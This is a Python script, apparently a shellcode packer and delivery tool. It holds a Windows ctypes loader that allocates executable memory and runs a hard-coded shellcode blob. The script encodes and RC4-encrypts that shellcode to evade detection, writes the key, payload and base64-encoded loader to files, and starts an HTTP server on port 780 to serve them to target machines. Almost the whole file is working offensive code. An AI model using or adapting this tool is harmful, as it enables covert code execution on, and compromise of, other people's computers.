# -*- coding: UTF-8 -*-
import string
import base64
import random
from os import system
from cryptography.fernet import Fernet
from sys import version_info


LOADER = """
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(buf), len(buf))
runcode = ctypes.cast(rwxpage, ctypes.CFUNCTYPE(ctypes.c_void_p))
runcode()
"""


class Rc4:
    def __init__(self):
        pass
    
    def init_box(self, key):
        s_box = list(range(256))
        j = 0
        for i in range(256):
            j = (j + s_box[i] + ord(key[i % len(key)])) % 256
            s_box[i], s_box[j] = s_box[j], s_box[i]
        return s_box

    def encrypt(self, message, key):
        ciphertext = self.run(message, key)
        if version_info >= (3,0):
            base64_cipher = str(base64.b64encode(ciphertext.encode('utf-8')), 'utf-8')  # python3
        else:
            base64_cipher = base64.b64encode(ciphertext)
        return base64_cipher

    def decrypt(self, message, key):
        if version_info >= (3,0):
            ciphertext = str(base64.b64decode(message.encode('utf-8')), 'utf-8') # python3
        else:
            ciphertext = base64.b64decode(message)
        plaintext = self.run(ciphertext, key)
        return plaintext

    def run(self, message, key):
        box = self.init_box(key)
        res = []
        i = j = 0
        for s in message:
            i = (i + 1) % 256
            j = (j + box[i]) % 256
            box[i], box[j] = box[j], box[i]
            t = (box[i] + box[j]) % 256
            k = box[t]
            res.append(chr(ord(s) ^ k))
        cipher = "".join(res)
        return cipher


class Xor:
    def __init__(self):
        pass

    def decrypt(self, message, xor_key):
        random.seed(xor_key)
        ciphertext = ''
        code = message.split('.')
        for i in code:
            ciphertext = ciphertext + chr(int(i) ^ random.randint(0, 255))
        return ciphertext

    def encrypt(self, message, xor_key):
        random.seed(xor_key)
        ciphertext = ''
        for i in message:
            ciphertext = ciphertext + str(ord(i) ^ random.randint(0, 255)) + "."
        return ciphertext.rstrip('.')


class Encoder:
    def __init__(self):
        pass

    def _base16(self, message):
        return base64.b16encode(message)

    def _base64(self, message):
        return base64.b64encode(message)

    def _base32(self, message):
        return base64.b32encode(message)

    def _hex(self, message):
        if version_info >= (3,0):
            return message.hex()
        else:
            return message.encode('hex')


class Encrypt:
    def __init__(self):
        pass

    def rc4_encrypt(self, message, rc4_key):
        return Rc4().encrypt(message, rc4_key)

    def xor_encrypt(self, message, xor_key):
        return Xor().encrypt(message, xor_key)

    def fernet_encrypt(self, message, fernet_key):
        return Fernet(fernet_key).encrypt(message)


class Decoder:
    def __init__(self):
        pass

    def _base64(self, message):
        return base64.b64decode(message)

    def _base32(self, message):
        return base64.b32decode(message)

    def _base16(self, message):
        return base64.b16decode(message)

    def _hex(self, message):
        if version_info >= (3,0):
            return bytes.fromhex(message)
        else:
            return message.decode('hex')


class Decrypt:
    def __init__(self):
        pass

    def rc4_decrypt(self, message, rc4_key):
        return Rc4().decrypt(message, rc4_key)    

    def xor_decrypt(self, message, xor_key):
        return Xor().decrypt(message, xor_key)

    def fernet_decrypt(self, message, fernet_key):
        return Fernet(fernet_key).encrypt(message)


class GetKey:
    def __init__(self):
        pass

    def random_key(self, length):
        numOfNum = random.randint(1, length-1)
        numOfLetter = length - numOfNum
        slcNum = [random.choice(string.digits) for i in range(numOfNum)]
        slcLetter = [random.choice(string.ascii_letters) for i in range(numOfLetter)]
        slcChar = slcNum + slcLetter
        random.shuffle(slcChar)
        getPwd = ''.join([i for i in slcChar])
        return getPwd
    
    def fernet_key(self, length):
        return Fernet.generate_key()


if __name__ == "__main__":
    buf =  b""
    buf += b"\xbf\xb8\xb3\xb2\x7f\xd9\xc0\xd9\x74\x24\xf4\x58"
    buf += b"\x2b\xc9\xb1\xb8\x83\xc0\x04\x31\x78\x0e\x03\xc0"
    buf += b"\xbd\x50\x8a\xeb\x0a\x4d\x01\x2f\x7f\xd6\x83\x99"
    buf += b"\x49\x84\x0f\xcc\x7c\x7b\x1e\x3f\x3c\x64\x62\x7c"
    buf += b"\xda\x17\xa7\xef\x8e\xd4\x30\x15\x60\x24\xcc\x37"
    buf += b"\xdd\x03\x8a\x3d\xd4\x33\x81\x0a\x6b\xa9\x40\x1a"
    buf += b"\x9c\xaf\x75\xf6\xa7\x08\x9c\xa7\x89\xa3\x7a\x1d"
    buf += b"\xd2\xfa\x14\xb2\xf3\xfe\x3a\x44\x02\x03\x07\xb0"
    buf += b"\x49\xcf\x0c\xee\xf3\x3f\x34\x05\x54\x87\x27\x46"
    buf += b"\x4b\xa0\x28\xfb\x9a\x0d\xdb\x75\xc6\x77\x3d\xb1"
    buf += b"\x5b\xe8\x18\xab\xe0\x1e\xbf\xaa\x28\x81\xe7\xa8"
    buf += b"\xd0\x59\x05\x3e\x3e\x8f\xb5\x5b\xe5\x0c\xb5\x52"
    buf += b"\xc7\x11\x11\xbb\x4f\xaf\x40\x66\xff\x4e\x44\xa2"
    buf += b"\xc4\x19\x0c\xbb\xcd\xaf\x58\xa6\x45\xa6\xe0\xf1"
    buf += b"\x2d\x8a\x82\xd2\xc6\x94\x0d\x03\x79\x06\x16\xeb"
    buf += b"\x66\x99\x57\x68\xf1\x54\x2b\xe4\x37\x6d\x99\x9f"
    buf += b"\x89\xce\xaf\x72\x20\x50\x25\x41\x54\xae\x38\xc1"
    buf += b"\x0a\x0d\x56\xab\x4b\x18\x8f\x49\xe1\x0f\x50\x9e"
    buf += b"\x3a\xbd\xe3\xa0\x45\x83\x81\xc4\xf3\xa4\xd0\x6e"
    buf += b"\x54\xb5\x16\x59\x12\x57\x26\xc0\x2c\x90\xf3\x03"
    buf += b"\xd9\x56\x55\xcf\xcf\xee\xfd\xa9\x65\x63\x9b\x8b"
    buf += b"\x97\x59\x1c\x08\x0e\xb5\x09\xc1\x2f\x55\x4f\xed"
    buf += b"\xa3\xfc\x9e\xf1\xef\x28\x0b\xf6\xa3\x8c\x01\x56"
    buf += b"\xff\x2b\x7f\x88\xa4\x96\x99\x35\xe6\x72\xad\x1d"
    buf += b"\x0f\xb0\x94\xca\xd8\x08\xd7\x09\x63\x1c\x04\x32"
    buf += b"\x57\xea\x43\x23\x24\xc8\xcb\x1e\x4a\x9f\xfa\x75"
    buf += b"\xc3\x7e\x49\x5d\xbd\x38\xbb\x09\xc3\x3b\x5b\xaf"
    buf += b"\x66\x44\x10\x0a\x1e\xc9\x2d\x71\x12\x26\x66\x2f"
    buf += b"\x75\x47\x91\x6a\x54\x7e\x2f\x91\x0d\x9a\xf4\x18"
    buf += b"\xd2\x86\xbc\x7f\xf6\xdf\xd3\x82\x91\x1b\x0d\x1b"
    buf += b"\xc2\xb9\xcb\x4a\x01\x31\xdd\xc8\xe9\x74\x4f\xd2"
    buf += b"\x75\x13\x17\x1b\x8a\x76\xd1\x22\x7f\xa2\x08\xd4"
    buf += b"\xc8\x75\x31\x2d\x44\x31\x97\x62\x77\xff\xe3\xae"
    buf += b"\xd7\x4b\xe5\x50\xbe\x94\x4a\xd7\xb3\x21\x24\x4a"
    buf += b"\x7e\x93\x09\x49\xeb\xd1\x1f\x43\x2d\x6b\xc9\x22"
    buf += b"\xda\x19\xb7\x2e\xfd\x7c\x97\xbf\xd6\x59\xc7\x12"
    buf += b"\xed\x2d\x1d\xe5\x59\x63\x65\x71\xea\x87\x48\x11"
    buf += b"\x5e\xe4\xf5\xdd\xdd\x8e\xf7\x95\x4a\x24\x19\x11"
    buf += b"\xc2\x17\x9c\xb6\xa2\x48\xc8\xce\xb5\xd4\xeb\x3f"
    buf += b"\xdb\xc5\x2c\xa1\x1f\xa1\xd6\x83\x25\x41\x15\x0b"
    buf += b"\xa0\xd6\xab\xa9\x45\x4c\x6d\xa5\x46\x08\x67\x40"
    buf += b"\xce\xbd\xf8\x7d\xd8\xea\x56\x65\x46\x1f\xb2\xaa"
    buf += b"\xd0\x22\x6c\x2e\x2d\xd9\x4d\x8c\x6f\xb6\xfa\xa9"
    buf += b"\x0c\x0e\xaf\xa6\xab\x40\xf4\xcf\x14\x22\x06\xef"
    buf += b"\xf0\x55\x29\x72\xbc\x4e\xee\xcd\x1f\x88\x47\x28"
    buf += b"\x32\xbe\x6f\x42\x14\x14\x70\x64\x66\x9b\x1d\x7b"
    buf += b"\x12\xd1\xee\x6d\xb9\xe7\xce\xbd\x6d\xfc\x29\xd7"
    buf += b"\x5a\xc6\xda\x52\xbd\x86\x60\xc5\x4c\xf2\xf5\x75"
    buf += b"\x62\xe9\xe5\xf7\xe8\x3d\xe3\x44\xa2\x97\xfe\x1a"
    buf += b"\x59\x7d\x20\x6c\x8e\x06\x4b\x04\x0c\x05\x71\x11"
    buf += b"\x53\xff\xd3\xc1\xb5\x29\xc9\x35\x9d\xa3\xaf\x38"
    buf += b"\xa8\xb8\x57\x4e\x2f\x78\x1d\x2b\xe4\x0b\xca\xd0"
    buf += b"\xb9\x41\xcc\x66\x24\x24\x41\xfa\x80\xf7\x7f\xf0"
    buf += b"\xc7\xdb\x7f\x8a\x56\xde\x60\x08\xca\x07\x10\xd2"
    buf += b"\x11\x3d\x0b\x75\xb4\xef\xd2\xe5\x7c\x33\x70\xe1"
    buf += b"\xfc\x08\x92\xb4\xa0\x7d\x20\xd5\x8e\x92\x3c\xab"
    buf += b"\xde\x87\x18\xaa\xc0\xb5\x48\x95\x17\x79\xcc\x2f"
    buf += b"\xc2\x32\x0e\xe1\xca\xd3\xe3\xd2\x25\x7a\xcb\x61"
    buf += b"\x45\xc9\x72\xef\x13\x98\x3b\xe6\xe7\x37\x92\x1a"
    buf += b"\xc7\x0c\x66\xce\xbb\xa6\x54\xf3\x9c\x8f\xf1\xbd"
    buf += b"\x68\x7a\xfb\x90\xe0\xb3\x4d\x9b\xb3\x20\xa2\x4c"
    buf += b"\x4a\xd8\x3a\x4d\x19\x21\xbd\xe4\xde\xb8\x49\xf9"
    buf += b"\x74\xce\x1a\x6f\x74\xc4\x5a\x15\xdb\xa1\x33\x03"
    buf += b"\xb8\xe8\xcd"
    # base64 + hex + rc4
    key = GetKey().random_key(10)
    buf = Encoder()._base64(buf)
    buf = Encoder()._hex(buf)
    buf = Encrypt().rc4_encrypt(buf, key)
    base64_loader = Encoder()._base64(LOADER.encode('utf-8')).decode("utf-8")
    print("key: " + key + "\n")
    print("shellcode: " + buf + "\n")
    print("loader: " + base64_loader + "\n")
    # read-in data
    with open('code.txt', mode='w') as f1:
        f1.write(buf)
    with open('key.txt', mode='w') as f2:
        f2.write(key)
    with open('loader.txt', mode='w') as f3:
        f3.write(base64_loader)
    if version_info >= (3,0):
        system("python3 -m http.server 780")
    else:
        system("python2 -m SimpleHTTPServer 780")
    
